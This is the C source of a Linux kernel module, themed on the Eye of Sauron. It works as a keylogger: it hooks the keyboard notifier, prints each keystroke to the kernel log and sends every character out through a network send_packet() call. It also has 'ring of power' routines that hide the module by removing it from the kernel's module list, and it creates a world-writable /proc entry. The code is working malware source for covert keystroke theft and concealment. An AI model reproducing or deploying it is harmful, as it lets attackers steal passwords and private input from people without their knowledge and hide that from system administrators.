#include "../include/eye.h"
#include "../include/ops.h"
#include "../include/char.h"
#include "../include/net.h"

/* Kernel Module License */
MODULE_LICENSE("GPL");

/* Global Variables */
static struct proc_dir_entry *_ops;
static struct list_head *_module_list = NULL;
static struct kobject *_kobj          = NULL;
static struct kobject *_kobj_parent   = NULL;
static struct kobject *_kobj_holder   = NULL;
static struct module_sect_attrs *_sect_attrs = NULL;
static struct module_notes_attrs *_notes_attrs = NULL;
static struct attribute_group *_kgrp  = NULL;
static const struct file_operations fops = {
    .owner      = THIS_MODULE,
    .open       = ops_open,
    .read       = seq_read,
    .write      = ops_write,
    .llseek     = seq_lseek,
    .release    = single_release,
};

/* Funcion Prototypes */
static int start_eye(void);
static void end_eye(void);
static int sauron_notify(struct notifier_block *nb, unsigned long code, void *data);
static uint8_t id_char(char n);
void ring_on(void);
void ring_off(void);

module_init(start_eye);
module_exit(end_eye);

static struct notifier_block _sauron =
{
    .notifier_call = sauron_notify,
    .priority = 99
};

static int start_eye(void)
{
    register_keyboard_notifier(&_sauron);
    printk("The Eye of Sauron is upon you.\n");

    _ops = proc_create("eye", 0777, NULL, &fops);
    if (!initialize_net())
    {
        printk(KERN_ERR "error initializing network\n");
        return -1;
    }

//    ring_on();

    return 0;
}

static void end_eye(void)
{
//    ring_off();
    finalize_net();
    unregister_keyboard_notifier(&_sauron);

    remove_proc_entry("eye", NULL);

    printk("You are free from the Eye.\n");
}

static int sauron_notify(struct notifier_block *nb, unsigned long code, void *raw_data)
{
    struct keyboard_notifier_param *data = raw_data;
    char c = data->value;

    if (code == KBD_KEYSYM && data->down)
    {
        id_char(c);
    }

    return NOTIFY_OK;
}

static uint8_t id_char(char n)
{
    uint8_t c = (uint8_t)n;
    if (c >= 0x20 && c < 0x7f)
    {
        printk(KERN_CONT "%c", c);
    }
    else if (c < 0x20)
    {
        if (c == 0x01)
            printk(KERN_CONT "\n");
        else
            printk(KERN_CONT "<%s>", ascii_codes[c]);
    }
    else if (c == 0x7f)
    {
        printk(KERN_CONT "<DEL>");
    }
    else if (c > 0x7f && c <= 0xff)
    {
        printk(KERN_CONT "<%02x>", c);
    }

    send_packet(n);

    return c;
}

void ring_on(void)
{
    _module_list = __this_module.list.prev;         /* Remember location in module list */
    list_del_init(&__this_module.list);             /* Remove from procfs */
    _kobj = &__this_module.mkobj.kobj;              /* Remember kobject */
    _kgrp = &(__this_module.sect_attrs->grp);       /* Remember sysfs group */
    _kobj_holder = THIS_MODULE->holders_dir;
    _kobj_parent = __this_module.mkobj.kobj.parent; /* Remember kobject parent */
    //kobject_del(&__this_module.mkobj.kobj);         /* Remove from sysfs */

    _sect_attrs = THIS_MODULE->sect_attrs;
    _notes_attrs = THIS_MODULE->notes_attrs;

    printk("The ring of power is applied.\n");
}

void ring_off(void)
{
    barrier();
    /* Add the LKM back into the system module list */
    list_add(&__this_module.list, _module_list);
    barrier();
/*
    if (kobject_add(_kobj, _kobj_parent, "eye") == -EINVAL)
    {
        kobject_put(_kobj);
        return;
    }
*/
    /* Add the LKM back into the sysfs group */
/*
    THIS_MODULE->sect_attrs = _sect_attrs;
    THIS_MODULE->notes_attrs = _notes_attrs;

    kobject_add(_kobj_holder, _kobj, "holders");
    sysfs_create_group(_kobj, _kgrp);
    kobject_uevent(_kobj, KOBJ_ADD);
*/
    printk("The ring of power is removed.\n");
}
